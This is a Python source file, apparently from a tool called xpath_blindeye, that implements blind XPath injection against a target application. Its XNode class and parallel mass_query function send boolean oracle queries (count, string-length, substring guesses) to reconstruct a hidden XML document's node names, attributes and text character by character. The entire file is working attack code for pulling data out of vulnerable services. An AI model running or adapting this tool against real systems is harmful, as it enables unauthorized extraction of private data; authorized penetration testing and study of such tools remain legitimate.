import re
import string
import logging
from typing import List, Set, Dict, Union
from xml.etree.ElementTree import Element
from concurrent.futures import ProcessPoolExecutor, as_completed

from xpath_blindeye.config import MAX_NODE_NAME_LENGTH, ROOT_PATH, SOFT_CHARSET_FAIL, MAX_WORKERS
from xpath_blindeye.requestor import request
from xpath_blindeye.util import rreplace

logger = logging.getLogger("xpath-blindeye")


class XNode(object):
    def __init__(self, node_name: str, path: str, parent: Element, xml_root: Element, saved_root: Element):
        self.node_name = node_name
        self.path = path
        self.parent = parent
        self.xml_root = xml_root
        self.saved_root = saved_root

    def _get_known_attribute_counts(self) -> Set[int]:
        nodes = self._get_similar_known_nodes()

        attr_counts = []
        for n in nodes:
            if n.text is not None:
                attr_counts.append(len(n.attrib))
        quick_list = set(attr_counts)
        return quick_list

    def _get_similar_known_nodes(self) -> List[Element]:
        search_path = self.path.replace(ROOT_PATH, '', 1)
        search_path = search_path.strip('/')
        index_re = re.compile(r'(\[\d+\])')
        search_path = index_re.sub('', search_path)
        search_path = rreplace(search_path, '*', self.node_name, 1)
        if ROOT_PATH == self.path:
            search_path = "."
        nodes = self.xml_root.findall(search_path)  # type: List[Element]
        if self.saved_root is not None:
            nodes.extend(self.saved_root.findall(search_path))
        return nodes

    def get_attribute_count(self):
        attr_path = self.path + '/@*'
        quick_list = self._get_known_attribute_counts()
        return self.get_quick_guess_or_count(attr_path, quick_list)

    def get_quick_guess_or_count(self, path: str, quick_list: Set[int]) -> int:
        q = 'count({path}) = {guess}'
        attr_count = mass_query(q, {'path': path}, quick_list)
        if attr_count is not None:
            return attr_count
        return self.get_count(path, start_count=0)

    def _get_known_attr_names(self) -> Set[str]:
        nodes = self._get_similar_known_nodes()
        attr_names = []
        for n in nodes:
            if n.attrib:
                attr_names.extend(n.attrib.keys())
        quick_list = set(attr_names)
        return quick_list

    def _get_known_attr_values(self, attr_name: str) -> Set[str]:
        nodes = self._get_similar_known_nodes()
        attr_values = []
        for n in nodes:
            if n.attrib and attr_name in n.attrib:
                attr_values.append(n.attrib[attr_name])
        quick_list = set(attr_values)
        return quick_list

    def get_attributes(self) -> Dict[str, str]:
        attr_count = self.get_attribute_count()
        attributes = {}
        if attr_count <= 0:
            return attributes
        for i in range(1, attr_count + 1):
            attr_path = self.path + '/@*[{index}]'.format(index=i)
            known_attr_names = self._get_known_attr_names()
            attr_name = mass_query("name({path}) = '{guess}'", {'path': attr_path}, known_attr_names)
            if attr_name is None:
                attr_name = self.get_node_name(attr_path)

            known_attr_values = self._get_known_attr_values(attr_name)
            attr_value = mass_query("{path} = '{guess}'", {'path': attr_path}, known_attr_values)
            if attr_value is None:
                attr_value = self.get_path_string_value(attr_path)
            attributes[attr_name] = attr_value
        return attributes

    def get_node_text_length(self) -> int:
        q = "string-length(normalize-space({path}/text())) =  {guess}"
        return self._get_integer_guess(self.path, q, start_count=0, step=20)

    def _get_known_node_text(self) -> Set[str]:
        nodes = self._get_similar_known_nodes()

        node_texts = []
        for n in nodes:
            if n.text is not None:
                node_texts.append(n.text)
        quick_list = set(node_texts)
        return quick_list

    def get_node_text(self) -> Union[str, None]:
        substring_query = "substring(translate(normalize-space({path}/text()), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),{start},1) = '{guess}'"
        capitalization_query = "normalize-space({path}/text()) = '{guess}'"
        text_length = self.get_node_text_length()
        if not text_length:
            return None

        known_node_texts = self._get_known_node_text()
        text = mass_query(capitalization_query, {'path': self.path}, known_node_texts)
        if text is None:
            text = self._extract_text(self.path, text_length, substring_query, capitalization_query)
        return text

    def get_known_child_node_names(self) -> Set[str]:
        nodes = self._get_similar_known_nodes()

        node_children = []
        for n in nodes:
            node_children.extend(list(n))
        quick_list = set([c.tag for c in node_children])
        return quick_list

    def get_child_node_names(self) -> List[str]:
        child_count = self.get_number_of_children()
        child_names = []
        if child_count == 0:
            return []
        known_names = self.get_known_child_node_names()
        for i in range(1, child_count + 1):
            child_name = None
            child_path = self.path + '/*[{}]'.format(i)
            q = "name({path}) = '{guess}'"
            if known_names:
                child_name = mass_query(q, {'path': child_path}, known_names)
            if child_name is None:
                child_name = self.get_node_name(child_path)
            known_names.add(child_name)
            child_names.append((child_name, child_path))
        return child_names

    def _get_known_children_counts(self) -> Set[int]:
        children = self._get_similar_known_nodes()
        quick_list = set([len(list(c)) for c in children])
        return quick_list

    def get_number_of_children(self) -> int:
        child_path = self.path + '/*'
        quick_list = self._get_known_children_counts()
        return self.get_quick_guess_or_count(child_path, quick_list)

    @classmethod
    def get_count(cls, path: str, start_count=0, step=50) -> int:
        q = 'count({path}) = {guess}'
        return cls._get_integer_guess(path, q, start_count, step)

    @classmethod
    def _get_integer_guess(cls, path: str, q: str, start_count: int, step: int) -> int:
        initial_range = range(start_count, start_count + step)
        count = mass_query(q, {'path': path}, initial_range)
        if count is None:
            return cls._get_integer_guess(path, q, start_count + step, step)
        else:
            return count

    @classmethod
    def get_node_name(cls, path: str) -> str:
        p = "name({path})".format(path=path)
        real_node_name = cls.get_path_string_value(p)
        return real_node_name

    @classmethod
    def get_path_string_value(cls, path: str) -> str:
        substring_query = "substring(translate({path}, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),{start},1) = '{guess}'"
        capitalization_query = "{path} = '{guess}'"
        string_length = cls.get_length(path)
        real_string = cls._extract_text(path, string_length, substring_query, capitalization_query)
        return real_string

    @classmethod
    def _extract_text(cls, path: str, text_length: int, substring_query: str, capitalization_query: str) -> str:
        primary_charset = list('abcdefghijklmnopqrstuvwxyz0123456789 \n\t')
        fallback_charset = set('\'!@#$%^&*()_=+",./?-:;<>~`')
        charsets = [primary_charset, fallback_charset]
        node_text = ""
        for i in range(1, text_length + 1):
            current_letter = None
            for charset in charsets:
                current_letter = mass_query(substring_query, {'start': i, 'path': path}, charset)
                if current_letter is not None:
                    break
            try:
                node_text += current_letter
            except TypeError:
                if SOFT_CHARSET_FAIL:
                    logger.error('Could not identify character, using "?" instead')
                    node_text += '?'
                else:
                    raise
        # Included node_text.title() and string.capwords(node_text) for edge case on .title() --- he's turns to He'S
        guesses = [node_text, node_text.upper(), node_text.capitalize(), node_text.title(), string.capwords(node_text),
                   '-'.join([w.capitalize() for w in node_text.split('-')])]
        real_text_value = mass_query(capitalization_query, {'path': path}, guesses)
        if real_text_value is None:
            if not SOFT_CHARSET_FAIL:
                # TODO: Iterate over upper/lower case for each alphabet value
                raise Exception('Edge case (Unknown case of node text {}), handle later (or now :) )'.format(node_text))
            else:
                logger.error("None of {} matched case for {}".format(guesses, node_text))
                return node_text
        return real_text_value

    @classmethod
    def get_length(cls, path: str, start_length=0) -> int:
        if start_length > MAX_NODE_NAME_LENGTH:
            raise Exception("Name length of a node exeeded {}".format(MAX_NODE_NAME_LENGTH))
        q = "string-length({path}) = {guess}"
        initial_range = range(start_length + 1, start_length + 11)
        length = mass_query(q, {'path': path}, initial_range)
        if length is None:
            return cls.get_length(path, start_length + 10)
        else:
            return length


def mass_query(query: str, query_parameters: Dict[str, str], guesses: Union[Set, List]) -> Union[int, str, None]:
    correct_guess = None
    params = query_parameters.copy()
    if len(guesses) > 0:
        with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:

            future_to_index = {}
            for g in guesses:
                # Change query to work with ' and " character
                if not isinstance(g, int):
                    if "'" in g:
                        query = query.replace("'", '"')
                    elif '"' in g:
                        query = query.replace('"', "'")
                future_to_index[executor.submit(request, query.format(guess=g, **params))] = g

            for future in as_completed(future_to_index):
                guess = future_to_index[future]
                is_correct = future.result()
                if is_correct:
                    logger.info("{} - {}".format(guess, is_correct))
                else:
                    logger.debug("{} - {}".format(guess, is_correct))
                if is_correct:
                    correct_guess = guess
                    break
            executor.shutdown()
    return correct_guess
